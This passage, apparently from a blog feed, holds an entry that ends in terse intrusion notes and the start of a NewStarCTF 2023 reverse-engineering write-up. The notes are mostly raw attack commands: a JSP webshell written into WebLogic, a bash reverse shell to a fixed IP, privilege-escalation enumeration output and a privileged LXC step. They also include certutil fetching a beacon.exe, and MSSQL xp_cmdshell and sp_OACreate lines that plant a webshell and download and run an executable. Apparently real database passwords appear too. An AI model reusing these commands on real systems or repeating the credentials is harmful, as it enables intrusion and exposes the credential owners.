ZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9IAolPg==</p><p>echo PCUhIFN0 |base64 -d &gt; /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp<br>cat /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</p><p><a href="http://172.16.100.21:7001/bea_wls_internal/a.jsp">http://172.16.100.21:7001/bea_wls_internal/a.jsp</a></p><p>echo ‘a’ &gt; /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</p><p>mysql -h 172.17.20.250 -u typecho -p</p><p>bash -i &gt;&amp; /dev/tcp/172.16.100.21/2333 0&gt;&amp;1</p><p> This is the sshd server system-wide configuration file.  See<br> sshd_config(5) for more information.</p><p> This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</p><p> The strategy used for options in the default sshd_config shipped with<br> OpenSSH is to specify options with their default value where<br> possible, but leave them commented.  Uncommented options override the<br> default value.</p><p>Include /etc/ssh/sshd_config.d/*.conf</p><p>Port 22<br>AddressFamily any<br>ListenAddress 0.0.0.0<br>ListenAddress ::</p><p>HostKey /etc/ssh/ssh_host_rsa_key<br>HostKey /etc/ssh/ssh_host_ecdsa_key<br>HostKey /etc/ssh/ssh_host_ed25519_key</p><p> Ciphers and keying<br>RekeyLimit default none</p><p> Logging<br>SyslogFacility AUTH<br>LogLevel INFO</p><p> Authentication:</p><p>LoginGraceTime 2m<br>PermitRootLogin prohibit-password<br>StrictModes yes<br>MaxAuthTries 6<br>MaxSessions 10</p><p>PubkeyAuthentication yes</p><p> Expect .ssh/authorized_keys2 to be disregarded by default in future.<br>AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</p><p>AuthorizedPrincipalsFile none</p><p>AuthorizedKeysCommand none<br>AuthorizedKeysCommandUser nobody</p><p> For this to work you will also need host keys in /etc/ssh/ssh_known_hosts<br>HostbasedAuthentication no<br> Change to yes if you don&apos;t trust ~/.ssh/known_hosts for<br> HostbasedAuthentication<br>IgnoreUserKnownHosts no<br> Don&apos;t read the user&apos;s ~/.rhosts and ~/.shosts files<br>IgnoreRhosts yes</p><p> To disable tunneled clear text passwords, change to no here!<br>PasswordAuthentication yes<br>PermitEmptyPasswords no</p><p> Change to yes to enable challenge-response passwords (beware issues with<br> some PAM modules and threads)<br>KbdInteractiveAuthentication no</p><p> Kerberos options<br>KerberosAuthentication no<br>KerberosOrLocalPasswd yes<br>KerberosTicketCleanup yes<br>KerberosGetAFSToken no</p><p> GSSAPI options<br>GSSAPIAuthentication no<br>GSSAPICleanupCredentials yes<br>GSSAPIStrictAcceptorCheck yes<br>GSSAPIKeyExchange no</p><p> Set this to &apos;yes&apos; to enable PAM authentication, account processing,<br> and session processing. If this is enabled, PAM authentication will<br> be allowed through the KbdInteractiveAuthentication and<br> PasswordAuthentication.  Depending on your PAM configuration,<br> PAM authentication via KbdInteractiveAuthentication may bypass<br> the setting of &quot;PermitRootLogin without-password&quot;.<br> If you just want the PAM account and session checks to run without<br> PAM authentication, then enable this but set PasswordAuthentication<br> and KbdInteractiveAuthentication to &apos;no&apos;.<br>UsePAM yes</p><p>AllowAgentForwarding yes<br>AllowTcpForwarding yes<br>GatewayPorts no<br>X11Forwarding yes<br>X11DisplayOffset 10<br>X11UseLocalhost yes<br>PermitTTY yes<br>PrintMotd no<br>PrintLastLog yes<br>TCPKeepAlive yes<br>PermitUserEnvironment no<br>Compression delayed<br>ClientAliveInterval 0<br>ClientAliveCountMax 3<br>UseDNS no<br>PidFile /run/sshd.pid<br>MaxStartups 10:30:100<br>PermitTunnel no<br>ChrootDirectory none<br>VersionAddendum none</p><p> no default banner path<br>Banner none</p><p> Allow client to pass locale environment variables<br>AcceptEnv LANG LC_*</p><p> override default of no subsystems<br>Subsystem sftp    /usr/lib/openssh/sftp-server</p><p> Example of overriding settings on a per-user basis<br>Match User anoncvs<br>    X11Forwarding no<br>    AllowTcpForwarding no<br>    PermitTTY no<br>    ForceCommand cvs server<br>PasswordAuthentication yes</p><h2 id="lse-sh"><a href="#lse-sh" class="headerlink" title="$ ./lse.sh"></a>$ ./lse.sh</h2><h2 id="If-you-know-the-current-user-password-write-it-here-to-check-sudo-privileges"><a href="#If-you-know-the-current-user-password-write-it-here-to-check-sudo-privileges" class="headerlink" title="If you know the current user password, write it here to check sudo privileges:"></a>If you know the current user password, write it here to check sudo privileges:</h2><p> LSE Version: 4.5nw</p><pre><code>    User: acequan User ID: 1000Password: none    Home: /home/acequan    Path: /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/bin:/home/acequan/Oracle/Middleware/                                                                                     Oracle_Home/wlserver/server/bin:/home/acequan/Oracle/Middleware/Oracle_Home/wlserver/../oracle_common/modules/thirdparty/org.a                                                                                     pache.ant/1.10.5.0.0/apache-ant-1.10.5/bin:/usr/lib/jvm/jre/bin:/usr/lib/jvm/bin:/usr/lib/jvm/bin:/usr/local/sbin:/usr/local/b                                                                                     in:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin   umask: 0027Hostname: meetsec-devserver   Linux: 5.15.0-43-generic</code></pre><p>Distribution: Ubuntu 22.04.1 LTS<br>Architecture: x86_64</p><p>=====================( Current Output Verbosity Level: 0 )======================<br>===============================================================( humanity )=====<br>[!] nowar0 Should we question autocrats and their “military operations”?… yes!</p><hr><pre><code>                                  NO                                  WAR</code></pre><hr><p>==================================================================( users )=====<br>[i] usr000 Current user groups……………………………………… yes!<br>[<em>] usr010 Is current user in an administrative group?………………… yes!<br>[</em>] usr020 Are there other users in administrative groups?…………….. yes!<br>[<em>] usr030 Other users with shell…………………………………… yes!<br>[i] usr040 Environment information………………………………….. skip<br>[i] usr050 Groups for other users…………………………………… skip<br>[i] usr060 Other users…………………………………………….. skip<br>[</em>] usr070 PATH variables defined inside /etc………………………… yes!<br>[!] usr080 Is ‘.’ in a PATH variable defined inside /etc?……………… nope<br>===================================================================( sudo )=====<br>[!] sud000 Can we sudo without a password?…………………………… nope<br>[!] sud010 Can we list sudo commands without a password?………………. nope<br>[<em>] sud040 Can we read sudoers files?……………………………….. nope<br>[</em>] sud050 Do we know if any other users used sudo?…………………… yes!<br>============================================================( file system )=====<br>[<em>] fst000 Writable files outside user’s home………………………… yes!<br>[</em>] fst010 Binaries with setuid bit…………………………………. yes!<br>[!] fst020 Uncommon setuid binaries…………………………………. yes!</p><hr><p>/snap/snapd/17029/usr/lib/snapd/snap-confine<br>/snap/snapd/17336/usr/lib/snapd/snap-confine</p><hr><p>[!] fst030 Can we write to any setuid binary?………………………… nope<br>[<em>] fst040 Binaries with setgid bit…………………………………. skip<br>[!] fst050 Uncommon setgid binaries…………………………………. skip<br>[!] fst060 Can we write to any setgid binary?………………………… skip<br>[</em>] fst070 Can we read /root?………………………………………. nope<br>[<em>] fst080 Can we read subdirectories under /home?……………………. nope<br>[</em>] fst090 SSH files in home directories…………………………….. nope<br>[<em>] fst100 Useful binaries…………………………………………. yes!<br>[</em>] fst110 Other interesting files in home directories………………… nope<br>[!] fst120 Are there any credentials in fstab/mtab?…………………… nope<br>[<em>] fst130 Does ‘acequan’ have mail?………………………………… nope<br>[!] fst140 Can we access other users mail?…………………………… nope<br>[</em>] fst150 Looking for GIT/SVN repositories………………………….. nope<br>[!] fst160 Can we write to critical files?…………………………… nope<br>[!] fst170 Can we write to critical directories?……………………… nope<br>[!] fst180 Can we write to directories from PATH defined in /etc?………. nope<br>[!] fst190 Can we read any backup?………………………………….. yes!</p><hr><p>-rw-r—– 1 acequan acequan 35786 11月  8 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.3.zip<br>-rw-r—– 1 acequan acequan 35786 11月  9 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.2.zip<br>-rw-r—– 1 acequan acequan 35786 11月  5 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.6.zip<br>-rw-r—– 1 acequan acequan 35786 11月  7 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.4.zip<br>-rw-r—– 1 acequan acequan 35786 11月 11 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.0.zip<br>-rw-r—– 1 acequan acequan 35786 11月 10 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.1.zip<br>-rw-r—– 1 acequan acequan 35786 11月 12 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.zip<br>-rw-r—– 1 acequan acequan 35786 11月  6 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.5.zip</p><hr><p>[!] fst200 Are there possible credentials in any shell history file?……. nope<br>[!] fst210 Are there NFS exports with ‘no_root_squash’ option?…………. nope<br>[<em>] fst220 Are there NFS exports with ‘no_all_squash’ option?………….. nope<br>[i] fst500 Files owned by user ‘acequan’…………………………….. skip<br>[i] fst510 SSH files anywhere………………………………………. skip<br>[i] fst520 Check hosts.equiv file and its contents……………………. skip<br>[i] fst530 List NFS server shares…………………………………… skip<br>[i] fst540 Dump fstab file…………………………………………. skip<br>=================================================================( system )=====<br>[i] sys000 Who is logged in………………………………………… skip<br>[i] sys010 Last logged in users…………………………………….. skip<br>[!] sys020 Does the /etc/passwd have hashes?…………………………. nope<br>[!] sys022 Does the /etc/group have hashes?………………………….. nope<br>[!] sys030 Can we read shadow files?………………………………… nope<br>[</em>] sys040 Check for other superuser accounts………………………… nope<br>[<em>] sys050 Can root user log in via SSH?…………………………….. nope<br>[i] sys060 List available shells……………………………………. skip<br>[i] sys070 System umask in /etc/login.defs…………………………… skip<br>[i] sys080 System password policies in /etc/login.defs………………… skip<br>===============================================================( security )=====<br>[</em>] sec000 Is SELinux present?……………………………………… nope<br>[<em>] sec010 List files with capabilities……………………………… yes!<br>[!] sec020 Can we write to a binary with caps?……………………….. nope<br>[!] sec030 Do we have all caps in any binary?………………………… nope<br>[</em>] sec040 Users with associated capabilities………………………… nope<br>[!] sec050 Does current user have capabilities?………………………. skip<br>[!] sec060 Can we read the auditd log?………………………………. nope<br>========================================================( recurrent tasks )=====<br>[<em>] ret000 User crontab……………………………………………. nope<br>[!] ret010 Cron tasks writable by user………………………………. nope<br>[</em>] ret020 Cron jobs………………………………………………. yes!<br>[<em>] ret030 Can we read user crontabs………………………………… nope<br>[</em>] ret040 Can we list other user cron tasks?………………………… nope<br>[<em>] ret050 Can we write to any paths present in cron jobs……………… yes!<br>[!] ret060 Can we write to executable paths present in cron jobs……….. nope<br>[i] ret400 Cron files……………………………………………… skip<br>[</em>] ret500 User systemd timers……………………………………… nope<br>[!] ret510 Can we write in any system timer?…………………………. nope<br>[i] ret900 Systemd timers………………………………………….. skip<br>================================================================( network )=====<br>[<em>] net000 Services listening only on localhost………………………. yes!<br>[!] net010 Can we sniff traffic with tcpdump?………………………… nope<br>[i] net500 NIC and IP information…………………………………… skip<br>[i] net510 Routing table…………………………………………… skip<br>[i] net520 ARP table………………………………………………. skip<br>[i] net530 Nameservers…………………………………………….. skip<br>[i] net540 Systemd Nameservers……………………………………… skip<br>[i] net550 Listening TCP…………………………………………… skip<br>[i] net560 Listening UDP…………………………………………… skip<br>===============================================================( services )=====<br>[!] srv000 Can we write in service files?……………………………. nope<br>[!] srv010 Can we write in binaries executed by services?……………… nope<br>[</em>] srv020 Files in /etc/init.d/ not belonging to root………………… nope<br>[<em>] srv030 Files in /etc/rc.d/init.d not belonging to root…………….. nope<br>[</em>] srv040 Upstart files not belonging to root……………………….. nope<br>[<em>] srv050 Files in /usr/local/etc/rc.d not belonging to root………….. nope<br>[i] srv400 Contents of /etc/inetd.conf………………………………. skip<br>[i] srv410 Contents of /etc/xinetd.conf……………………………… skip<br>[i] srv420 List /etc/xinetd.d if used……………………………….. skip<br>[i] srv430 List /etc/init.d/ permissions…………………………….. skip<br>[i] srv440 List /etc/rc.d/init.d permissions…………………………. skip<br>[i] srv450 List /usr/local/etc/rc.d permissions………………………. skip<br>[i] srv460 List /etc/init/ permissions………………………………. skip<br>[!] srv500 Can we write in systemd service files?…………………….. nope<br>[!] srv510 Can we write in binaries executed by systemd services?………. nope<br>[</em>] srv520 Systemd files not belonging to root……………………….. nope<br>[i] srv900 Systemd config files permissions………………………….. skip<br>===============================================================( software )=====<br>[!] sof000 Can we connect to MySQL with root/root credentials?…………. nope<br>[!] sof010 Can we connect to MySQL as root without password?…………… nope<br>[!] sof015 Are there credentials in mysql_history file?……………….. nope<br>[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?….. nope<br>[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?….. nope<br>[*] sof030 Installed apache modules…………………………………. nope<br>[!] sof040 Found any .htpasswd files?……………………………….. nope<br>[!] sof050 Are there private keys in ssh-agent?………………………. nope<br>[!] sof060 Are there gpg keys cached in gpg-agent?……………………. nope<br>[!] sof070 Can we write to a ssh-agent socket?……………………….. nope</p><h2 id="sof080-Can-we-write-to-a-gpg-agent-socket-………………………-yes"><a href="#sof080-Can-we-write-to-a-gpg-agent-socket-………………………-yes" class="headerlink" title="[!] sof080 Can we write to a gpg-agent socket?……………………….. yes!"></a>[!] sof080 Can we write to a gpg-agent socket?……………………….. yes!</h2><p>/run/user/1000/gnupg/S.gpg-agent<br>/run/user/1000/gnupg/S.gpg-agent.ssh<br>/run/user/1000/gnupg/S.gpg-agent.extra<br>/run/user/1000/gnupg/S.gpg-agent.browser</p><hr><p>[!] sof090 Found any keepass database files?…………………………. nope<br>[!] sof100 Found any ‘pass’ store directories?……………………….. nope<br>[!] sof110 Are there any tmux sessions available?…………………….. nope<br>[<em>] sof120 Are there any tmux sessions from other users?………………. nope<br>[!] sof130 Can we write to tmux session sockets from other users?………. nope<br>[!] sof140 Are any screen sessions available?………………………… nope<br>[</em>] sof150 Are there any screen sessions from other users?…………….. nope<br>[!] sof160 Can we write to screen session sockets from other users?…….. nope<br>[<em>] sof170 Can we access MongoDB databases without credentials?………… nope<br>[i] sof500 Sudo version……………………………………………. skip<br>[i] sof510 MySQL version…………………………………………… skip<br>[i] sof520 Postgres version………………………………………… skip<br>[i] sof530 Apache version………………………………………….. skip<br>[i] sof540 Tmux version……………………………………………. skip<br>[i] sof550 Screen version………………………………………….. skip<br>=============================================================( containers )=====<br>[</em>] ctn000 Are we in a docker container?…………………………….. nope<br>[<em>] ctn010 Is docker available?…………………………………….. nope<br>[!] ctn020 Is the user a member of the ‘docker’ group?………………… nope<br>[</em>] ctn200 Are we in a lxc container?……………………………….. nope<br>[!] ctn210 Is the user a member of any lxc/lxd group?…………………. yes!</p><hr><h2 id="acequan-adm-cdrom-sudo-dip-plugdev-lpadmin-lxd-sambashare"><a href="#acequan-adm-cdrom-sudo-dip-plugdev-lpadmin-lxd-sambashare" class="headerlink" title="acequan adm cdrom sudo dip plugdev lpadmin lxd sambashare"></a>acequan adm cdrom sudo dip plugdev lpadmin lxd sambashare</h2><p>==============================================================( processes )=====<br>[i] pro000 Waiting for the process monitor to finish………………….. yes!<br>[i] pro001 Retrieving process binaries………………………………. yes!<br>[i] pro002 Retrieving process users…………………………………. yes!<br>[!] pro010 Can we write in any process binary?……………………….. nope<br>[<em>] pro020 Processes running with root permissions……………………. yes!<br>[</em>] pro030 Processes running by non-root users with shell……………… yes!<br>[i] pro500 Running processes……………………………………….. skip<br>[i] pro510 Running process binaries and permissions…………………… skip<br>===================================================================( CVEs )=====<br>In order to test for CVEs, download lse.sh from the GitHub releases page.<br>Alternatively, build lse_cve.sh using tools/package_cvs_into_lse.sh from the repository.</p><p>==================================( FINISHED )==================================<br>$ lxc init ubuntu: ignite -c security.privileged=true</p><p>certutil -urlcache -split -f <a href="http://192.168.144.129/beacon.exe">http://192.168.144.129/beacon.exe</a> C:\xxx.exe</p><p>iptables -A PREROUTING -p tcp -d 192.168.111.131 –dport 822 -j DNAT –to-destination 192.168.1.88:8080</p><p>iptables -A POSTROUTING -p tcp -d 192.168.1.88 –dport 8080 -j SNAT –to-source 192.168.111.131</p><p>define(‘DB_HOST’, ‘localhost’); //数据库服务器地址<br>define(‘DB_USER’, ‘fk_huoxingtu_cn’);  //数据库用户名<br>define(‘DB_PWD’, ‘haK6eF4jxw3YKDEW’);//数据库密码<br>define(‘DB_NAME’, ‘fk_huoxingtu_cn’);  //数据库名称<br>define(‘DB_PORT’, ‘3306’);  //数据库端口</p><p>define(‘IN_DBHOST’, ‘127.0.0.1’);<br>define(‘IN_DBUSER’, ‘fenfa’);<br>define(‘IN_DBPW’, ‘yEAnzRb6dMMBtZ47’);<br>define(‘IN_DBNAME’, ‘fenfa’);</p><p>execute master..xp_dirtree ‘c:’,1,1</p><p>exec master..xp_cmdshell ‘net user’ ;<br>bitsadmin /transfer n <a href="https://www.baidu.com/robots.txt">https://www.baidu.com/robots.txt</a> c:a.txt<br>c:\users\Administrator\desktop\a.txt</p><p>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘createtextfile’, @f out, ‘c:\inetpub\wwwroot\s.jsp’, 1<br>exec @ret = sp_oamethod @f, ‘writeline’, NULL,’&lt;%execute(request(“a”))%&gt;’</p><p>exec master..xp_cmdshell ‘“echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(“<a href="http://example/test0.exe&quot;,&quot;%TEMP%/test.exe&quot;">http://example/test0.exe&quot;,&quot;%TEMP%\test.exe&quot;</a>) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create “%TEMP%\test.exe””‘</p><p>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate ‘scripting.filesystemobject’, @o out<br>exec sp_oamethod @o, ‘createtextfile’, @f out, ‘C:\inetpub\wwwroot\s.jsp’, 1<br>exec @ret = sp_oamethod @f, ‘writeline’, NULL,’&lt;%execute(request(“a”))%&gt;’<br>exec master..xp_cmdshell ‘dir c:\inetpub\wwwroot&#39; ;</p><p>exec master..xp_cmdshell ‘“echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(“<a href="http://ip/chunqiu.exe&quot;,&quot;%TEMP%/test.exe&quot;">http://ip/chunqiu.exe&quot;,&quot;%TEMP%\test.exe&quot;</a>) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create “%TEMP%\test.exe””‘</p><p>certutil -urlcache -split -f <a href="http://ip/chunqiu.exe">http://ip/chunqiu.exe</a> c:\a.exe</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023公开赛道WEEK2</title>
      <link href="/2023/11/13/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/"/>
      <url>/2023/11/13/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/</url>
      
        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-公开赛道-WEEK2"><a href="#NewStarCTF-2023-公开赛道-WEEK2" class="headerlink" title="NewStarCTF 2023 公开赛道 WEEK2"></a>NewStarCTF 2023 公开赛道 WEEK2</h3><h4 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h4><h5 id="WEEK2-REVERSE-PZthon"><a href="#WEEK2-REVERSE-PZthon" class="headerlink" title="WEEK2|REVERSE PZthon"></a>WEEK2|REVERSE PZthon</h5><p><img src="/images/xinshengsai/image-20231113141154075.png" alt="image-20231113141154075"></p><p>下载文件，看起来像是py文件，py文件的话拖ida是不行的，至于为什么不行，我也不知道，大佬说的，</p><p><img src="/images/xinshengsai/image-20231113141300930.png" alt="image-20231113141300930"></p><p>拖到ida里，也不行，太多东西了。</p><p><code>https://github.com/extremecoders-re/pyinstxtractor</code></p><p>可以使用这个python exe 反编译工具进行反编译，</p><p><code>python3 .\pyinstxtractor.py ..\PZthon\PZthon.exe</code></p><p>解出来之后会看到这个文件名的以pyc为后缀的文件，拿到这个pyc反编译的网站，<code>https://tool.lu/pyc/</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    art = <span class="string">&#x27;\n              ___                                                                      \n    //   ) )     / /    //   ) )  // | |     / /        // | |  \\ / / \\    / /       \n   //___/ /     / /    //        //__| |    / /        //__| |   \\  /   \\  / /        \n  / ____ /     / /    //  ____  / ___  |   / /        / ___  |   / /     \\/ /         \n //           / /    //    / / //    | |  / /        //    | |  / /\\     / /          \n//           / /___ ((____/ / //     | | / /____/ / //     | | / /  \\   / /           \n                                                                                       \n     / /        //   / / ||   / / //   / /  / /       /__  ___/ ||   / |  / / //   ) ) \n    / /        //____    ||  / / //____    / /          / /     ||  /  | / / //   / /  \n   / /        / ____     || / / / ____    / /          / /      || / /||/ / //   / /   \n  / /        //          ||/ / //        / /          / /       ||/ / |  / //   / /    \n / /____/ / //____/ /    |  / //____/ / / /____/ /   / /        |  /  | / ((___/ /     \n&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(art)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(<span class="built_in">input</span>(<span class="string">&#x27;Please give me the flag: &#x27;</span>).encode())</span><br><span class="line"></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">110</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">88</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">103</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">125</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">70</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">118</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">123</span>,</span><br><span class="line">    <span class="number">113</span>,</span><br><span class="line">    <span class="number">69</span>,</span><br><span class="line">    <span class="number">79</span>,</span><br><span class="line">    <span class="number">82</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">89</span>,</span><br><span class="line">    <span class="number">84</span>,</span><br><span class="line">    <span class="number">77</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">99</span>,</span><br><span class="line">    <span class="number">112</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">65</span>,</span><br><span class="line">    <span class="number">39</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">97</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">102</span>,</span><br><span class="line">    <span class="number">86</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">36</span>,</span><br><span class="line">    <span class="number">104</span>]</span><br><span class="line">data = hello()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    data[i] = data[i] ^ <span class="number">21</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">bytearray</span>(enc) == data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;WOW!!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;I believe you can do it!&#x27;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;To be continue...&#x27;</span>)</span><br><span class="line"><span class="comment">#代码很简单，就是你输入的的至亦或21与enc比较，那我们直接亦或回来即可</span></span><br><span class="line"><span class="comment">#poc:</span></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">115</span>,</span><br><span class="line">    <span class="number">121</span>,</span><br><span class="line">    <span class="number">116</span>,</span><br><span class="line">    <span class="number">114</span>,</span><br><span class="line">    <span class="number">110</span>,</span><br><span class="line">    <span class="number">76</span>,</span><br><span class="line">    <span class="number">37</span>,</span><br><span class="line">    <span class="number">96</span>,</span><br><span class="line">    <span class="number">88</span>,</span><br><span class="line">    <span 